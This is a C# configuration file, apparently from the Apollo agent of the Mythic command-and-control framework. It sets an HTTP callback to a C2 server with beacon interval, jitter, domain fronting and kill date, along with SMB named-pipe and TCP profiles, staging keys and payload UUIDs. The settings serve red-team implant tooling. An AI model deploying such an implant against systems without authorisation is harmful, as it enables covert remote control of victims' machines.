#define HTTP


using HttpTransport;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Structs.ApolloStructs;
using PSKCryptography;
using ApolloInterop.Serializers;
using NamedPipeTransport;
using TcpTransport;

namespace Apollo
{
    public static class Config
    {
        public static Dictionary<string, C2ProfileData> EgressProfiles = new Dictionary<string, C2ProfileData>()
        {
#if HTTP
            { "http", new C2ProfileData()
                {
                    TC2Profile = typeof(HttpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
                        { "callback_interval", "5" },
                        { "callback_jitter", "0" },
                        { "callback_port", "80" },
                        { "callback_host", "http://mythic" },
                        { "post_uri", "data" },
                        { "encrypted_exchange_check", "T" },
                        { "proxy_host", "" },
                        { "proxy_port", "" },
                        { "proxy_user", "" },
                        { "proxy_pass", "" },
                        { "domain_front", "domain_front" },
                        { "killdate", "-1" },
                        { "USER_AGENT", "Apollo-Refactor" }
                    }
                }
            },
#endif
#if SMB
            { "smb", new C2ProfileData()
                {
                    TC2Profile = typeof(NamedPipeProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
                        { "pipename", "p39kmyt7-ro3l-c3id-vo2v-6efqxg1dxshh" },
                        { "encrypted_exchange_check", "T" },
                    }
                }
            },
#elif TCP
            { "tcp", new C2ProfileData()
                {
                    TC2Profile = typeof(TcpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
                        { "port", "40000" },
                        { "encrypted_exchange_check", "T" },
                    }
                }
            }
#endif
        };


        public static Dictionary<string, C2ProfileData> IngressProfiles = new Dictionary<string, C2ProfileData>();
#if HTTP
        public static string StagingRSAPrivateKey = "8GnFo5hkJHnK2+ZXmLs+mg+NF67bOlRyWrfrXWZG3Vg=";
#elif SMB
        public static string StagingRSAPrivateKey = "2EyBlgkPYL4Ez1+haxSaPQpCb5IwQsjt4V1TL1+jsXw=";
#elif TCP
        public static string StagingRSAPrivateKey = "OeQ4qFs0m5ANM0HfMn0Bsxb229XcRurbFxF3VsxfoRE=";
#endif
#if HTTP
        public static string PayloadUUID = "11be0fb4-a6e7-4a11-ba38-fccadb28fd50";
#elif SMB
        public static string PayloadUUID = "8cb8d2d3-a36a-4cb3-b217-f07e0d39b6c9";
#elif TCP
        public static string PayloadUUID = "f6049b32-0de6-461e-887e-2961f744411b";
#endif
    }
}
